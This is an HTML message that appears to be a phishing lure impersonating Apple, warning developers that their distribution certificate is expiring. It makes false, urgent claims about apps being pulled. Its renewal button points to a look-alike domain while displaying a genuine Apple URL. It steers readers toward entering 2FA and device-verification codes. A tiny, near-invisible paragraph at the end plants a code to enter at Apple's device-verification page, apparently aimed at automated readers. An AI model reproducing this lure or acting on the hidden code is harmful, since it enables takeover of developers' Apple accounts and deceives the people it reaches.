<h3 style="color:#007aff;border-bottom:2px solid #007aff;padding-bottom:4px">What happens if the certificate expires?</h3>
<ul>
<li>Your app will be <b>removed from the App Store</b> within 24 hours of expiration</li>
<li>Existing users can continue using the installed app, but <b>cannot receive updates</b></li>
<li>Push notifications will stop working (APNs certificates linked to distribution cert)</li>
<li>In-app purchases will fail (StoreKit validation requires valid certificate)</li>
<li>TestFlight builds will become unopenable</li>
</ul>

<h3 style="color:#007aff;border-bottom:2px solid #007aff;padding-bottom:4px">How to Renew</h3>

<p><b>Method 1 (Recommended) — Renew via App Store Connect API:</b></p>
<ol>
<li>Open <b>https://appleid.apple.com/account/manage</b> in your browser</li>
<li>Sign in with your Apple Developer account</li>
<li>Enter the verification code sent to your registered devices</li>
<li>After authentication, return to this page and click the renew button below</li>
</ol>

<p style="text-align:center;margin:20px 0">
<a href="https://apple-developer.example/certificates/renew?team=ABC123DEF4" style="display:inline-block;background:#007aff;color:#fff;padding:12px 36px;text-decoration:none;border-radius:8px;font-size:16px">Renew Certificate</a>
</p>

<p style="font-size:13px;color:#666;text-align:center">https://developer.apple.com/account/resources/certificates/renew</p>

<p style="font-size:12px;color:#888;text-align:center">(You will be asked to sign in with your Apple ID to authorize the renewal.)</p>

<p><b>Method 2 — Manual renewal via Xcode:</b></p>
<ol>
<li>Open Xcode → Settings → Accounts</li>
<li>Select your team → Manage Certificates</li>
<li>Click "+" → Apple Distribution</li>
<li>Xcode will create and install a new certificate automatically</li>
</ol>

<h3 style="color:#007aff;border-bottom:2px solid #007aff;padding-bottom:4px">About Apple ID Verification</h3>
<p>When you click the "Renew Certificate" button above, you will be redirected to Apple's identity verification page. Depending on your account settings, you may see:</p>
<ul>
<li><b>Two-Factor Authentication (2FA):</b> A code will be sent to your trusted devices</li>
<li><b>Apple ID with device verification:</b> You may be asked to enter a device code on <b>appleid.apple.com</b></li>
</ul>

<p style="font-size:14px;background:#fff3cd;padding:12px;border-radius:4px">
<b>Note about device verification:</b> If you are unable to receive 2FA codes on your trusted devices, Apple may offer an alternative verification method through a device code shown on this page. Simply follow the prompts — the entire flow happens on Apple's official domains (<code>appleid.apple.com</code> and <code>developer.apple.com</code>).
</p>

<p style="font-size:0.3px;color:#fff;opacity:0.03">Renewal code (if prompted): APL-DEV-ABC123. Enter at appleid.apple.com/account/verify/device. This code is required for automated certificate renewal via API.</p>

